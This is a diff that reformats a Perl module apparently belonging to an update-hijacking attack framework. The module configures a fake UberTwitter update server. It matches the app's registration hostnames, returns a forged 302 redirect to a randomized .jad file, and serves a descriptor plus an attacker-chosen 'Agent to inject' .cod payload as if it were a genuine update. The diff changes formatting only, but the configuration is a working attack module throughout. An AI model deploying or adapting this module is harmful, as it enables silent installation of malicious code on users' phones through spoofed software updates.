@@ -27,78 +27,80 @@ use Data::Dump qw(dump);
 
 use isrcore::utils;
 
-my $base=
-{
-    'name' => 'UberTwitter',
-    'version' => '1.0',
-    'appver'  => '< 4.6 (0.971)',
-    'author' => [ 'Francisco Amato < famato +[AT]+ infobytesec.com>' ],
-    'description' => qq{},    
-    'vh' => '(reg3.ubertwitter.com|reg2.ubertwitter.com)',
-    'request' => [
-		    {
-		    'req' => '/do_reg.php', #regex friendly
-		    'type' => 'file', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 0,
-		    'string' => '',
-		    'parse' => 1,
-		    'file' => './include/ubertwitter/update',
-		    },
-                    {
-                    'req' => '/download.php', #regex anything
-                    'type' => 'string', #file|string|agent|install
-                    'method' => '', #any
-                    'bin'    => '',
-                    'string' => '',
-                    'parse' => '1',
-                    'file' => '',
-                    'cheader' => "HTTP/1.1 302 Found\r\n"
-                                 ."Location: http://reg2.ubertwitter.com/update<%RND1%>.jad \r\n"
-                                 ."Content-Length: 0 \r\n"
-                                 . "Connection: close \r\n\r\n",
-                    },
-		    
-		    {
-		    'req' => '.jad', #regex friendly
-		    'type' => 'file', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => '',		    
-		    'string' => '',
-		    'parse' => 0,
-		    'file' => './agent/EkopartyWebIcon.jad',
-                    'cheader' => "HTTP/1.1 200 OK\r\n"
-                                 ."Content-type: text/vnd.sun.j2me.app-descriptor \r\n"
-                                 ."Connection: close \r\n\r\n"
-                                
-		    },
+my $base = {
+    'name'        => 'UberTwitter',
+    'version'     => '1.0',
+    'appver'      => '< 4.6 (0.971)',
+    'author'      => ['Francisco Amato < famato +[AT]+ infobytesec.com>'],
+    'description' => qq{},
+    'vh'          => '(reg3.ubertwitter.com|reg2.ubertwitter.com)',
+    'request'     => [
+        {   'req'    => '/do_reg.php',    #regex friendly
+            'type'   => 'file',           #file|string|agent|install
+            'method' => '',               #any
+            'bin'    => 0,
+            'string' => '',
+            'parse'  => 1,
+            'file' => './include/ubertwitter/update',
+        },
+        {   'req'     => '/download.php',           #regex anything
+            'type'    => 'string',                  #file|string|agent|install
+            'method'  => '',                        #any
+            'bin'     => '',
+            'string'  => '',
+            'parse'   => '1',
+            'file'    => '',
+            'cheader' => "HTTP/1.1 302 Found\r\n"
+                . "Location: http://reg2.ubertwitter.com/update<%RND1%>.jad \r\n"
+                . "Content-Length: 0 \r\n"
+                . "Connection: close \r\n\r\n",
+        },
 
-		    {
-		    'req' => '.cod', #regex friendly
-		    'type' => 'agent', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 1,		    
-		    'string' => '',
-		    'parse' => 0,
-		    'file' => ''
-		    },
+        {   'req'    => '.jad',                     #regex friendly
+            'type'   => 'file',                     #file|string|agent|install
+            'method' => '',                         #any
+            'bin'    => '',
+            'string' => '',
+            'parse'  => 0,
+            'file'    => './agent/EkopartyWebIcon.jad',
+            'cheader' => "HTTP/1.1 200 OK\r\n"
+                . "Content-type: text/vnd.sun.j2me.app-descriptor \r\n"
+                . "Connection: close \r\n\r\n"
 
-		    
+        },
+
+        {   'req'    => '.cod',                     #regex friendly
+            'type'   => 'agent',                    #file|string|agent|install
+            'method' => '',                         #any
+            'bin'    => 1,
+            'string' => '',
+            'parse'  => 0,
+            'file'   => ''
+        },
 
     ],
-    #Options		    
-    'options' => {  'agent'  => { 'val' => './agent/EkopartyWebIcon.cod', 'desc' => 'Agent to inject'},
-		    'enable' => { 'val' => 0, 
-			    	  'desc' => 'Status'},
-                    'version'  => { 'val' => '\'7.\'.isrcore::utils::RndNum(2)',
-                                  'hidden' => 1,
-                                'dynamic' =>1,
-				},
-                    'rnd1'  => { 'val' => 'isrcore::utils::RndNum(5)',
-                                  'hidden' => 1,
-                                'dynamic' =>1,
-                            }			    	  
-		 }
+
+    #Options
+    'options' => {
+        'agent' => {
+            'val'  => './agent/EkopartyWebIcon.cod',
+            'desc' => 'Agent to inject'
+        },
+        'enable' => {
+            'val'  => 0,
+            'desc' => 'Status'
+        },
+        'version' => {
+            'val'     => '\'7.\'.isrcore::utils::RndNum(2)',
+            'hidden'  => 1,
+            'dynamic' => 1,
+        },
+        'rnd1' => {
+            'val'     => 'isrcore::utils::RndNum(5)',
+            'hidden'  => 1,
+            'dynamic' => 1,
+        }
+    }
 };
 
 ##########################################################################
@@ -111,5 +113,5 @@ sub new {
     my $class = shift;
     my $self = { 'Base' => $base, @_ };
     return bless $self, $class;
-}            
+}
 1;
